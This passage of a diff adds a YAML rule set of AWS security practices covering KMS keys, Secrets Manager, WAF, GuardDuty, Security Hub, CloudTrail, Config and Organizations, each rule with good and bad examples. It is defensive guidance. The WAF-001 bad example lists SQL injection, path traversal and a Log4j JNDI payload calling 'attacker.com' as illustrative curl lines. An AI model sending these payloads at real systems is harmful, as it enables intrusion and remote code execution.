@@ -1,0 +1,600 @@
+layer: rules
+technology: AWS
+domain: security
+knowledge:
+- id: CR-AWS-KMS-001
+  text: Use customer-managed KMS keys (CMKs) with strict key policies for sensitive data — never rely on AWS-managed keys
+    when you need access control or audit.
+  why: AWS-managed keys (aws/s3, aws/ebs, etc.) encrypt data but provide no access control — anyone with the AWS service permission
+    can decrypt. Customer-managed keys let you define exactly who can encrypt/decrypt through key policies. Without a CMK,
+    you cannot revoke decryption access independently of service access. You also cannot audit decryption events for AWS-managed
+    keys.
+  how_to_do_right: Create a CMK per data classification level (PII, financial, general). Define key policy with separate key
+    administrators (manage key) and key users (encrypt/decrypt). Enable CloudTrail logging for all KMS API calls. Use key
+    aliases for readability. Never embed key ARNs in code — use aliases or SSM parameters.
+  severity: high
+  technologies:
+    library: [kms]
+    platform: [aws]
+  domains:
+    domain: [security]
+    concern: [encryption]
+  example_good: "resource \"aws_kms_key\" \"pii_data\" {\n  description             = \"Encryption key for PII data\"\n  deletion_window_in_days\
+    \ = 30\n  enable_key_rotation     = true  # Automatic annual rotation\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\
+    \n    Statement = [\n      {\n        Sid    = \"KeyAdminAccess\"\n        Effect = \"Allow\"\n        Principal = { AWS\
+    \ = \"arn:aws:iam::123456789012:role/SecurityAdmin\" }\n        Action = [\n          \"kms:Create*\", \"kms:Describe*\"\
+    , \"kms:Enable*\", \"kms:List*\",\n          \"kms:Put*\", \"kms:Update*\", \"kms:Revoke*\", \"kms:Disable*\",\n     \
+    \     \"kms:Get*\", \"kms:Delete*\", \"kms:ScheduleKeyDeletion\",\n          \"kms:CancelKeyDeletion\"\n        ]\n  \
+    \      Resource = \"*\"\n      },\n      {\n        Sid    = \"KeyUserAccess\"\n        Effect = \"Allow\"\n        Principal\
+    \ = { AWS = \"arn:aws:iam::123456789012:role/AppServer\" }\n        Action = [\"kms:Encrypt\", \"kms:Decrypt\", \"kms:GenerateDataKey\"\
+    ]\n        Resource = \"*\"\n      }\n    ]\n  })\n}\nresource \"aws_kms_alias\" \"pii_data\" {\n  name          = \"\
+    alias/pii-data-key\"\n  target_key_id = aws_kms_key.pii_data.key_id\n}\n"
+  example_bad: "# Using AWS-managed key — no access control or audit\nresource \"aws_s3_bucket_server_side_encryption_configuration\"\
+    \ \"pii\" {\n  bucket = aws_s3_bucket.pii.id\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm\
+    \ = \"aws:kms\"\n      # No kms_master_key_id → uses aws/s3 managed key\n      # Anyone with s3:GetObject can decrypt\n\
+    \      # No CloudTrail events for decryption\n      # Cannot revoke decryption access without revoking S3 access\n   \
+    \ }\n  }\n}\n"
+  when_applies: Projects using AWS cloud infrastructure or KMS
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using AWS or KMS
+  sources: ["https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html#key-mgmt"]
+- id: CR-AWS-KMS-002
+  text: Enable automatic key rotation for all customer-managed KMS keys — rotation generates new key material annually without
+    breaking existing ciphertexts.
+  why: Without rotation, a compromised key material remains valid indefinitely. Regulatory frameworks (PCI-DSS, HIPAA, SOC2)
+    mandate regular key rotation. Manual rotation is error-prone and often forgotten. AWS automatic rotation creates new key
+    material every year while keeping all previous versions for decryption — existing encrypted data does NOT need re-encryption.
+  how_to_do_right: 'Set enable_key_rotation = true on all CMKs. For asymmetric keys or keys in custom key stores (automatic
+    rotation not supported), implement manual rotation: create new key, update aliases, re-encrypt critical data, schedule
+    old key deletion. Monitor rotation status with AWS Config rule ''cmk-backing-key-rotation-enabled''.'
+  severity: high
+  technologies:
+    library: [kms]
+    platform: [aws]
+  domains:
+    domain: [security, compliance]
+    concern: [encryption]
+  example_good: "resource \"aws_kms_key\" \"app_encryption\" {\n  description             = \"Application data encryption\
+    \ key\"\n  enable_key_rotation     = true  # Automatic annual rotation\n  deletion_window_in_days = 30    # 30-day safety\
+    \ window\n\n  # CloudTrail logging happens automatically for CMKs\n}\n\n# AWS Config rule to monitor rotation compliance\n\
+    resource \"aws_config_config_rule\" \"key_rotation\" {\n  name = \"cmk-key-rotation-enabled\"\n  source {\n    owner \
+    \            = \"AWS\"\n    source_identifier = \"CMK_BACKING_KEY_ROTATION_ENABLED\"\n  }\n}\n"
+  example_bad: "resource \"aws_kms_key\" \"app_encryption\" {\n  description         = \"Application data encryption key\"\
+    \n  enable_key_rotation = false  # Key material NEVER changes\n  # Compromised key stays valid forever\n  # PCI-DSS audit:\
+    \ FAIL — Section 3.6.4 requires key rotation\n  # SOC2 audit: FAIL — CC6.1 requires cryptographic key management\n}\n"
+  when_applies: Projects using AWS cloud infrastructure or KMS
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using AWS or KMS
+  sources: ["https://docs.aws.amazon.com/kms/latest/developerguide/rotate-keys.html"]
+- id: CR-AWS-KMS-003
+  text: Use envelope encryption for large data — encrypt data with a data key, then encrypt the data key with KMS.
+  why: KMS has a 4KB plaintext limit for direct encryption. Encrypting each record individually with KMS adds latency ($0.03/10K
+    requests + network round-trip per encrypt/decrypt). Envelope encryption generates a data key locally, encrypts data locally
+    (fast, no network), and only uses KMS to encrypt/decrypt the small data key. This is 100-1000x faster for bulk operations.
+  how_to_do_right: 'Call kms:GenerateDataKey to get a plaintext data key and its encrypted form. Use the plaintext key to
+    encrypt data locally (AES-256-GCM). Store the encrypted data key alongside the encrypted data. To decrypt: call kms:Decrypt
+    on the encrypted data key, then use the plaintext key to decrypt data locally. The AWS Encryption SDK handles this automatically.'
+  severity: medium
+  technologies:
+    library: [kms]
+    platform: [aws]
+  domains:
+    domain: [security, performance]
+    concern: [encryption]
+  example_good: "import boto3\nfrom cryptography.fernet import Fernet\nimport base64\n\nkms = boto3.client('kms')\n\n# Generate\
+    \ data key — KMS returns plaintext + encrypted versions\nresponse = kms.generate_data_key(\n    KeyId='alias/app-data-key',\n\
+    \    KeySpec='AES_256'\n)\nplaintext_key = response['Plaintext']       # Use to encrypt data locally\nencrypted_key =\
+    \ response['CiphertextBlob']   # Store alongside encrypted data\n\n# Encrypt data locally — fast, no network calls\nf\
+    \ = Fernet(base64.urlsafe_b64encode(plaintext_key[:32]))\nencrypted_data = f.encrypt(large_file_bytes)\n\n# Store: encrypted_key\
+    \ + encrypted_data (plaintext_key is discarded)\n# To decrypt: KMS decrypts the key, then key decrypts the data\n"
+  example_bad: "# Direct KMS encryption — 4KB limit, slow, expensive\nkms = boto3.client('kms')\nfor record in million_records:\n\
+    \    # One KMS API call per record — 1M API calls!\n    encrypted = kms.encrypt(\n        KeyId='alias/app-key',\n   \
+    \     Plaintext=json.dumps(record)  # Fails if >4KB\n    )\n    # Cost: 1M * $0.03/10K = $3 per run\n    # Latency: 1M\
+    \ * 10ms = 2.7 hours of KMS API calls\n"
+  when_applies: Projects using AWS cloud infrastructure or KMS
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using AWS or KMS
+  sources: ["https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html#enveloping"]
+- id: CR-AWS-SEC-001
+  text: Use Secrets Manager with automatic rotation for database credentials — never store credentials in code, environment
+    variables, or SSM Parameter Store without encryption.
+  why: Hardcoded credentials in code end up in git history, Docker images, and CI/CD logs. Environment variables are visible
+    in ECS task definitions, Lambda config, and process listings. SSM Parameter Store SecureString works but has no built-in
+    rotation. Secrets Manager provides automatic rotation via Lambda, versioning, cross-account access, and audit trail —
+    the credential is never exposed in infrastructure-as-code.
+  how_to_do_right: Store RDS credentials in Secrets Manager. Enable automatic rotation with a Lambda rotation function (AWS
+    provides templates for RDS/Aurora/Redshift). Use the Secrets Manager SDK caching client to minimize API calls. Reference
+    secrets by ARN in ECS task definitions, Lambda environment, and CloudFormation.
+  severity: critical
+  technologies:
+    library: [secrets manager]
+    platform: [aws, rds, lambda]
+  domains:
+    domain: [security, operations]
+  example_good: "# Secrets Manager with automatic RDS rotation\nresource \"aws_secretsmanager_secret\" \"db_creds\" {\n  name\
+    \                    = \"prod/rds/postgres\"\n  recovery_window_in_days = 30\n}\nresource \"aws_secretsmanager_secret_rotation\"\
+    \ \"db_creds\" {\n  secret_id           = aws_secretsmanager_secret.db_creds.id\n  rotation_lambda_arn = aws_lambda_function.rotation.arn\n\
+    \  rotation_rules {\n    automatically_after_days = 30  # Rotate every 30 days\n  }\n}\n\n# Python: use caching client\
+    \ (avoids API call per request)\nfrom aws_secretsmanager_caching import SecretCache\ncache = SecretCache()\n\ndef get_db_connection():\n\
+    \    secret = json.loads(cache.get_secret_string(\"prod/rds/postgres\"))\n    return psycopg2.connect(\n        host=secret['host'],\
+    \ port=secret['port'],\n        user=secret['username'], password=secret['password'],\n        dbname=secret['dbname']\n\
+    \    )\n"
+  example_bad: "# Credentials in environment variable — visible in ECS task definition\nresource \"aws_ecs_task_definition\"\
+    \ \"app\" {\n  container_definitions = jsonencode([{\n    name = \"app\"\n    environment = [\n      { name = \"DB_PASSWORD\"\
+    , value = \"SuperSecret123!\" }\n      # Visible in: AWS Console, API, CloudFormation, Terraform state\n      # No rotation\
+    \ — password valid until manually changed\n      # No audit trail — no way to know who accessed it\n    ]\n  }])\n}\n"
+  when_applies: Any project using AWS cloud infrastructure, Secrets Manager, AWS RDS managed databases, or AWS Lambda serverless
+    functions
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
+  sources: ["https://docs.aws.amazon.com/secretsmanager/latest/userguide/rotating-secrets.html"]
+- id: CR-AWS-SEC-002
+  text: Use the Secrets Manager SDK caching client to minimize API calls — do not fetch secrets on every request.
+  why: Secrets Manager charges $0.05 per 10,000 API calls. A web application handling 1,000 requests/second fetching a secret
+    per request makes 86.4M API calls/day = $432/day just for secret retrieval. The caching client stores the secret in memory
+    and refreshes it on a configurable interval (default 1 hour), reducing API calls to ~24/day per secret.
+  how_to_do_right: Install the aws-secretsmanager-caching library. Create a SecretCache instance at application startup (not
+    per request). Use cache.get_secret_string() instead of secretsmanager.get_secret_value(). Set cache TTL based on rotation
+    frequency. Invalidate cache on CredentialError exceptions.
+  severity: high
+  technologies:
+    library: [secrets manager]
+    platform: [aws]
+  domains:
+    domain: [security, operations, performance]
+    concern: [cost]
+  example_good: "# pip install aws-secretsmanager-caching\nfrom aws_secretsmanager_caching import SecretCache, SecretCacheConfig\n\
+    import botocore.session\n\n# Create cache at application startup — reuse across all requests\nclient = botocore.session.get_session().create_client('secretsmanager')\n\
+    cache_config = SecretCacheConfig(\n    secret_refresh_interval=3600,      # Refresh every hour\n    secret_version_stage_refresh_interval=3600,\n\
+    \    exception_retry_delay_base=1,\n    exception_retry_growth_factor=2,\n    exception_retry_delay_max=3600,\n)\ncache\
+    \ = SecretCache(config=cache_config, client=client)\n\n# Use in request handler — fetches from memory, not API\ndef handle_request():\n\
+    \    secret = json.loads(cache.get_secret_string(\"prod/rds/postgres\"))\n    conn = get_connection(secret)\n    # 1000\
+    \ requests/sec, but only 1 API call per hour\n"
+  example_bad: "import boto3\n\ndef handle_request():\n    # API call on EVERY request\n    client = boto3.client('secretsmanager')\
+    \  # New client per request!\n    response = client.get_secret_value(SecretId=\"prod/rds/postgres\")\n    secret = json.loads(response['SecretString'])\n\
+    \    # 1000 req/s * 86400 s/day = 86.4M API calls/day\n    # Cost: $432/day = $12,960/month (just for reading secrets!)\n"
+  when_applies: Projects using AWS cloud infrastructure or Secrets Manager
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using AWS or Secrets Manager
+  sources: ["https://docs.aws.amazon.com/securityhub/latest/userguide/what-is-securityhub.html"]
+- id: CR-AWS-WAF-001
+  text: Deploy AWS WAF with managed rule groups as baseline protection — always include AWSManagedRulesCommonRuleSet and AWSManagedRulesKnownBadInputsRuleSet.
+  why: Without WAF, your ALB/CloudFront/API Gateway is directly exposed to OWASP Top 10 attacks (SQL injection, XSS, path
+    traversal, command injection). AWS managed rule groups are maintained by the AWS Threat Research Team, updated regularly
+    with new signatures, and cost $1-3/month each. They block the vast majority of automated attacks without any custom rule
+    writing.
+  how_to_do_right: Create a WAF WebACL attached to your ALB/CloudFront/API Gateway. Add AWSManagedRulesCommonRuleSet (XSS,
+    SQLi, path traversal), AWSManagedRulesKnownBadInputsRuleSet (Log4j, SSRF), and AWSManagedRulesSQLiRuleSet. Set to COUNT
+    mode first for a week to verify no false positives, then switch to BLOCK. Add rate-based rules for DDoS protection.
+  severity: critical
+  technologies:
+    library: [waf, alb]
+    platform: [aws, cloudfront]
+  domains:
+    domain: [security, architecture]
+    concern: [web]
+  example_good: "resource \"aws_wafv2_web_acl\" \"main\" {\n  name  = \"production-waf\"\n  scope = \"REGIONAL\"  # Use CLOUDFRONT\
+    \ for CloudFront distributions\n\n  default_action { allow {} }\n\n  # Core rule set — XSS, SQLi, path traversal, file\
+    \ inclusion\n  rule {\n    name     = \"AWSManagedRulesCommonRuleSet\"\n    priority = 1\n    override_action { none {}\
+    \ }  # Use managed rule actions (BLOCK)\n    statement {\n      managed_rule_group_statement {\n        name        =\
+    \ \"AWSManagedRulesCommonRuleSet\"\n        vendor_name = \"AWS\"\n      }\n    }\n    visibility_config {\n      sampled_requests_enabled\
+    \   = true\n      cloudwatch_metrics_enabled = true\n      metric_name                = \"CommonRuleSet\"\n    }\n  }\n\
+    \n  # Known bad inputs — Log4j, SSRF patterns\n  rule {\n    name     = \"AWSManagedRulesKnownBadInputsRuleSet\"\n   \
+    \ priority = 2\n    override_action { none {} }\n    statement {\n      managed_rule_group_statement {\n        name \
+    \       = \"AWSManagedRulesKnownBadInputsRuleSet\"\n        vendor_name = \"AWS\"\n      }\n    }\n    visibility_config\
+    \ {\n      sampled_requests_enabled   = true\n      cloudwatch_metrics_enabled = true\n      metric_name             \
+    \   = \"KnownBadInputsRuleSet\"\n    }\n  }\n\n  # Rate-based rule — DDoS protection\n  rule {\n    name     = \"RateLimit\"\
+    \n    priority = 3\n    action { block {} }\n    statement {\n      rate_based_statement {\n        limit            \
+    \  = 2000  # 2000 requests per 5-min window per IP\n        aggregate_key_type = \"IP\"\n      }\n    }\n    visibility_config\
+    \ {\n      sampled_requests_enabled   = true\n      cloudwatch_metrics_enabled = true\n      metric_name             \
+    \   = \"RateLimit\"\n    }\n  }\n\n  visibility_config {\n    sampled_requests_enabled   = true\n    cloudwatch_metrics_enabled\
+    \ = true\n    metric_name                = \"ProductionWAF\"\n  }\n}\n"
+  example_bad: "# ALB directly exposed to internet — no WAF\nresource \"aws_lb\" \"api\" {\n  name               = \"api-lb\"\
+    \n  internal           = false\n  load_balancer_type = \"application\"\n  # No WAF attached\n  # SQL injection: curl \"\
+    https://api.example.com/users?id=1' OR 1=1--\"\n  # Path traversal: curl \"https://api.example.com/files/../../../etc/passwd\"\
+    \n  # Log4j: curl -H 'User-Agent: ${jndi:ldap://attacker.com/exploit}'\n"
+  when_applies: Any project using AWS cloud infrastructure, WAF, AWS CloudFront CDN, or ALB
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
+  sources: ["https://docs.aws.amazon.com/waf/latest/developerguide/what-is-aws-waf.html"]
+- id: CR-AWS-WAF-002
+  text: Enable WAF logging to S3 or CloudWatch for forensics — blocked requests are invisible without logs.
+  why: 'WAF blocks attacks silently. Without logging, you cannot: investigate attack patterns, tune rules to reduce false
+    positives, demonstrate compliance (PCI-DSS 10.6, SOC2 CC7.2), or identify targeted attacks before they succeed through
+    rule evasion. WAF logs contain the full request (headers, body excerpt, IP, country, matched rules) needed for incident
+    response.'
+  how_to_do_right: Enable WAF logging to an S3 bucket (for long-term storage) or CloudWatch Logs (for real-time analysis).
+    Log ALL actions (ALLOW, BLOCK, COUNT). Use Athena to query S3 logs for attack patterns. Create CloudWatch alarms on high
+    BLOCK counts. Retain logs for at least 90 days (365 for compliance).
+  severity: high
+  technologies:
+    library: [waf]
+    platform: [aws, s3, cloudwatch]
+  domains:
+    domain: [security, observability, compliance]
+  example_good: "resource \"aws_wafv2_web_acl_logging_configuration\" \"main\" {\n  log_destination_configs = [aws_s3_bucket.waf_logs.arn]\n\
+    \  resource_arn            = aws_wafv2_web_acl.main.arn\n\n  # Redact sensitive headers but keep everything else\n  redacted_fields\
+    \ {\n    single_header { name = \"authorization\" }\n    single_header { name = \"cookie\" }\n  }\n}\n\n# S3 bucket for\
+    \ WAF logs with lifecycle\nresource \"aws_s3_bucket\" \"waf_logs\" {\n  bucket = \"aws-waf-logs-${data.aws_caller_identity.current.account_id}\"\
+    \n}\nresource \"aws_s3_bucket_lifecycle_configuration\" \"waf_logs\" {\n  bucket = aws_s3_bucket.waf_logs.id\n  rule {\n\
+    \    id     = \"archive\"\n    status = \"Enabled\"\n    transition {\n      days          = 90\n      storage_class =\
+    \ \"GLACIER\"\n    }\n    expiration { days = 365 }\n  }\n}\n"
+  example_bad: "resource \"aws_wafv2_web_acl\" \"main\" {\n  name  = \"production-waf\"\n  # No logging configuration\n  #\
+    \ Attack blocked → no record exists\n  # False positive blocking customers → can't diagnose\n  # Security incident → no\
+    \ forensic evidence\n  # PCI audit: \"Show me your WAF logs\" → \"We don't have any\"\n}\n"
+  when_applies: Projects using AWS cloud infrastructure, WAF, AWS S3 object storage, or CloudWatch
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
+  sources: ["https://docs.aws.amazon.com/waf/latest/developerguide/waf-managed-rule-groups.html"]
+- id: CR-AWS-GD-001
+  text: Enable GuardDuty in all regions and all accounts — integrate findings with Security Hub and EventBridge for automated
+    response.
+  why: GuardDuty uses ML and threat intelligence to detect account compromise, cryptocurrency mining, data exfiltration, and
+    unauthorized access. It analyzes CloudTrail, VPC Flow Logs, and DNS logs WITHOUT you configuring anything. Attacks happen
+    in unused regions specifically because monitoring is not enabled there. Without automated response via EventBridge, findings
+    sit in the console unseen for days.
+  how_to_do_right: Enable GuardDuty in every AWS region in every account via AWS Organizations delegated admin. Enable all
+    protection plans (S3, EKS, Malware, Lambda). Create EventBridge rules for HIGH and CRITICAL findings that trigger Lambda
+    remediation (isolate instance, revoke credentials, notify on-call). Suppress known false positives with suppression rules,
+    not by ignoring.
+  severity: critical
+  technologies:
+    library: [guardduty, security hub]
+    platform: [aws, eventbridge]
+  domains:
+    domain: [security]
+    concern: [threat-detection]
+  example_good: "resource \"aws_guardduty_detector\" \"main\" {\n  enable = true\n  datasources {\n    s3_logs      { enable\
+    \ = true }\n    kubernetes   { audit_logs { enable = true } }\n    malware_protection { scan_ec2_instance_with_findings\
+    \ {\n      ebs_volumes { enable = true }\n    }}\n  }\n  finding_publishing_frequency = \"FIFTEEN_MINUTES\"\n}\n\n# EventBridge\
+    \ rule for critical findings → auto-remediation\nresource \"aws_cloudwatch_event_rule\" \"guardduty_critical\" {\n  name\
+    \ = \"guardduty-critical-findings\"\n  event_pattern = jsonencode({\n    source      = [\"aws.guardduty\"]\n    detail-type\
+    \ = [\"GuardDuty Finding\"]\n    detail = {\n      severity = [{ numeric = [\">=\", 7] }]  # HIGH and CRITICAL\n    }\n\
+    \  })\n}\nresource \"aws_cloudwatch_event_target\" \"remediation\" {\n  rule      = aws_cloudwatch_event_rule.guardduty_critical.name\n\
+    \  target_id = \"remediation-lambda\"\n  arn       = aws_lambda_function.auto_remediate.arn\n}\n"
+  example_bad: "# GuardDuty only in us-east-1\nresource \"aws_guardduty_detector\" \"main\" {\n  provider = aws.us-east-1\n\
+    \  enable   = true\n  # Not enabled in eu-west-1, ap-southeast-1, etc.\n  # Attacker launches crypto mining in ap-south-1\
+    \ → undetected\n  # No EventBridge integration → findings sit in console for days\n}\n"
+  when_applies: Any project using AWS cloud infrastructure, GuardDuty, EventBridge, or Security Hub
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
+  sources: ["https://docs.aws.amazon.com/guardduty/latest/ug/what-is-guardduty.html"]
+- id: CR-AWS-HUB-001
+  text: Enable Security Hub with CIS Benchmarks and AWS Foundational Security Best Practices — automate remediation for critical
+    findings.
+  why: Security Hub aggregates findings from GuardDuty, Inspector, Config, and third-party tools into a single dashboard with
+    compliance scoring. Without it, you must check 5+ consoles to understand your security posture. The CIS AWS Foundations
+    Benchmark has 50+ automated checks that catch the most common misconfigurations (public S3 buckets, unencrypted EBS, open
+    security groups).
+  how_to_do_right: 'Enable Security Hub in all accounts via Organizations. Enable both standards: CIS AWS Foundations Benchmark
+    1.4 and AWS Foundational Security Best Practices. Create EventBridge rules for CRITICAL/HIGH findings that trigger automated
+    remediation. Review the score weekly. Suppress findings you have compensating controls for (with documented justification).'
+  severity: high
+  technologies:
+    library: [security hub]
+    platform: [aws, configuration]
+  domains:
+    domain: [security, compliance, governance]
+  example_good: "resource \"aws_securityhub_account\" \"main\" {}\n\nresource \"aws_securityhub_standards_subscription\" \"\
+    cis\" {\n  standards_arn = \"arn:aws:securityhub:::ruleset/cis-aws-foundations-benchmark/v/1.4.0\"\n  depends_on    =\
+    \ [aws_securityhub_account.main]\n}\nresource \"aws_securityhub_standards_subscription\" \"aws_best_practices\" {\n  standards_arn\
+    \ = \"arn:aws:securityhub:us-east-1::standards/aws-foundational-security-best-practices/v/1.0.0\"\n  depends_on    = [aws_securityhub_account.main]\n\
+    }\n\n# Auto-remediate: encrypt unencrypted EBS volumes\nresource \"aws_cloudwatch_event_rule\" \"unencrypted_ebs\" {\n\
+    \  name = \"securityhub-unencrypted-ebs\"\n  event_pattern = jsonencode({\n    source      = [\"aws.securityhub\"]\n \
+    \   detail-type = [\"Security Hub Findings - Imported\"]\n    detail = {\n      findings = {\n        GeneratorId = [\"\
+    aws-foundational-security-best-practices/v/1.0.0/EC2.3\"]\n        Compliance  = { Status = [\"FAILED\"] }\n      }\n\
+    \    }\n  })\n}\n"
+  example_bad: '# No Security Hub — checking security across 5 different consoles
+
+    # Monday: Check GuardDuty — 3 findings
+
+    # Tuesday: Check Config — 15 non-compliant resources
+
+    # Wednesday: Check Inspector — 8 vulnerabilities
+
+    # Thursday: Check IAM Access Analyzer — 2 external access grants
+
+    # Friday: Check Macie — 5 S3 buckets with PII
+
+    # Result: 33 findings across 5 tools, no correlation, no priority
+
+    '
+  when_applies: Projects using AWS cloud infrastructure, Security Hub, or Config
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
+  sources: ["https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards.html"]
+- id: CR-AWS-CT-001
+  text: Enable a multi-region CloudTrail trail with log file validation — it is the foundation of all AWS security monitoring.
+  why: CloudTrail records every API call in your account — who did what, when, and from where. Without it, you have zero visibility
+    into administrative actions (IAM changes, security group modifications, resource deletions). A single-region trail misses
+    API calls made in other regions. Without log file validation, an attacker who compromises the S3 bucket can tamper with
+    logs to cover their tracks.
+  how_to_do_right: Create one multi-region trail per account (or organization trail for all accounts). Enable log file validation
+    (integrity check). Log to a dedicated S3 bucket in a security account with MFA delete enabled. Enable both management
+    events and data events for S3/Lambda. Set CloudWatch Logs integration for real-time alerting.
+  severity: critical
+  technologies:
+    library: [cloudtrail]
+    platform: [aws, s3]
+  domains:
+    domain: [security, compliance]
+    concern: [auditing]
+  example_good: "resource \"aws_cloudtrail\" \"main\" {\n  name                          = \"org-trail\"\n  s3_bucket_name\
+    \                = aws_s3_bucket.cloudtrail.id\n  is_multi_region_trail         = true\n  is_organization_trail      \
+    \   = true\n  enable_log_file_validation    = true\n  include_global_service_events = true\n  kms_key_id             \
+    \       = aws_kms_key.cloudtrail.arn\n\n  cloud_watch_logs_group_arn    = \"${aws_cloudwatch_log_group.cloudtrail.arn}:*\"\
+    \n  cloud_watch_logs_role_arn     = aws_iam_role.cloudtrail_cw.arn\n\n  event_selector {\n    read_write_type        \
+    \   = \"All\"\n    include_management_events = true\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values\
+    \ = [\"arn:aws:s3\"]  # All S3 data events\n    }\n  }\n}\n\n# S3 bucket with MFA delete and versioning\nresource \"aws_s3_bucket_versioning\"\
+    \ \"cloudtrail\" {\n  bucket = aws_s3_bucket.cloudtrail.id\n  versioning_configuration {\n    status     = \"Enabled\"\
+    \n    mfa_delete = \"Enabled\"  # Requires MFA to delete logs\n  }\n}\n"
+  example_bad: "# Single-region trail, no validation, no encryption\nresource \"aws_cloudtrail\" \"main\" {\n  name      \
+    \                 = \"my-trail\"\n  s3_bucket_name             = \"my-logs\"\n  is_multi_region_trail      = false  #\
+    \ Misses other regions\n  enable_log_file_validation = false  # Tamper-proof? No.\n  # No KMS encryption — logs readable\
+    \ by S3 access alone\n  # No CloudWatch integration — no real-time alerts\n  # No S3 versioning — attacker can delete\
+    \ logs\n}\n"
+  when_applies: Any project using AWS cloud infrastructure, CloudTrail, or AWS S3 object storage
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities
+  sources: ["https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-concepts.html"]
+- id: CR-AWS-CFG-001
+  text: Enable AWS Config with managed rules to continuously monitor resource compliance — Config is the backbone of preventive
+    security.
+  why: Security posture degrades over time — someone opens a security group for debugging and forgets to close it, an S3 bucket
+    policy is changed to public, an EBS volume is created without encryption. Without Config, these drifts are invisible until
+    exploited. Config continuously evaluates every resource against your rules and can trigger automated remediation.
+  how_to_do_right: Enable Config in all regions. Use conformance packs for baseline compliance (Operational Best Practices
+    for CIS, PCI-DSS, HIPAA). Add custom rules for organization-specific requirements. Configure remediation actions for critical
+    rules (auto-enable encryption, auto-restrict security groups). Store configuration history in S3 for audit trail.
+  severity: high
+  technologies:
+    platform: [aws, configuration]
+  domains:
+    domain: [security, compliance, governance]
+  example_good: "resource \"aws_config_configuration_recorder\" \"main\" {\n  name     = \"default\"\n  role_arn = aws_iam_role.config.arn\n\
+    \  recording_group {\n    all_supported = true\n    include_global_resource_types = true\n  }\n}\n\n# Managed rules for\
+    \ common misconfigurations\nresource \"aws_config_config_rule\" \"encrypted_volumes\" {\n  name = \"encrypted-volumes\"\
+    \n  source {\n    owner             = \"AWS\"\n    source_identifier = \"ENCRYPTED_VOLUMES\"\n  }\n}\nresource \"aws_config_config_rule\"\
+    \ \"restricted_ssh\" {\n  name = \"restricted-ssh\"\n  source {\n    owner             = \"AWS\"\n    source_identifier\
+    \ = \"INCOMING_SSH_DISABLED\"\n  }\n}\nresource \"aws_config_config_rule\" \"s3_bucket_ssl\" {\n  name = \"s3-bucket-ssl-requests-only\"\
+    \n  source {\n    owner             = \"AWS\"\n    source_identifier = \"S3_BUCKET_SSL_REQUESTS_ONLY\"\n  }\n}\n\n# Auto-remediation:\
+    \ encrypt unencrypted EBS volumes\nresource \"aws_config_remediation_configuration\" \"encrypt_ebs\" {\n  config_rule_name\
+    \ = aws_config_config_rule.encrypted_volumes.name\n  target_type      = \"SSM_DOCUMENT\"\n  target_id        = \"AWS-EncryptEBSVolume\"\
+    \n  automatic        = true\n  maximum_automatic_attempts = 3\n  retry_attempt_seconds      = 60\n}\n"
+  example_bad: '# No AWS Config — security drift is invisible
+
+    # Day 1: All EBS volumes encrypted ✓
+
+    # Day 30: Developer creates unencrypted volume for testing
+
+    # Day 60: Another developer copies AMI without encryption
+
+    # Day 90: 15 unencrypted volumes — nobody knows
+
+    # Day 120: Audit fails — "Where''s your evidence of continuous monitoring?"
+
+    '
+  when_applies: Projects using AWS cloud infrastructure or Config
+  when_not_applies: purely internal tools with no external exposure, throwaway scripts, or local development utilities. projects
+    not using AWS or Config
+  sources: ["https://docs.aws.amazon.com/config/latest/developerguide/evaluate-config.html"]
+- id: CR-AWS-ORG-001
+  text: Structure AWS Organizations with OUs and apply SCPs using deny-list strategy — prevent dangerous actions, allow everything
+    else.
+  why: Without OU structure, all accounts are in the root with no differentiation. A production account has the same permissions
+    as a sandbox account. SCPs with deny-list strategy are easier to maintain than allow-list (you don't need to enumerate
+    every allowed action). The OU structure enables different SCP policies for different environments — sandbox accounts get
+    more restrictions than production.
+  how_to_do_right: 'Create OUs: Security (log archive, audit), Infrastructure (networking, shared services), Workloads/Prod,
+    Workloads/Staging, Sandbox. Apply base SCPs to root (deny leaving org, deny disabling CloudTrail). Apply stricter SCPs
+    to Sandbox (deny expensive instance types, restrict regions). Use delegated administrator for Security Hub, GuardDuty,
+    Config.'
+  severity: high
+  technologies:
+    library: [organizations]
+    platform: [aws, iam]
+  domains:
+    domain: [security, governance]
+  example_good: "# OU structure\nresource \"aws_organizations_organizational_unit\" \"security\" {\n  name      = \"Security\"\
+    \n  parent_id = aws_organizations_organization.main.roots[0].id\n}\nresource \"aws_organizations_organizational_unit\"\
+    \ \"workloads_prod\" {\n  name      = \"Workloads-Prod\"\n  parent_id = aws_organizations_organization.main.roots[0].id\n\
+    }\nresource \"aws_organizations_organizational_unit\" \"sandbox\" {\n  name      = \"Sandbox\"\n  parent_id = aws_organizations_organization.main.roots[0].id\n\
+    }\n\n# Sandbox SCP — restrict expensive resources and regions\nresource \"aws_organizations_policy\" \"sandbox_guardrails\"\
+    \ {\n  name    = \"sandbox-guardrails\"\n  content = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n \
+    \     {\n        Sid       = \"DenyExpensiveInstances\"\n        Effect    = \"Deny\"\n        Action    = \"ec2:RunInstances\"\
+    \n        Resource  = \"arn:aws:ec2:*:*:instance/*\"\n        Condition = {\n          StringNotLike = {\n           \
+    \ \"ec2:InstanceType\": [\"t3.*\", \"t3a.*\", \"m5.large\"]\n          }\n        }\n      },\n      {\n        Sid  \
+    \     = \"DenyNonApprovedRegions\"\n        Effect    = \"Deny\"\n        NotAction = [\"iam:*\", \"organizations:*\"\
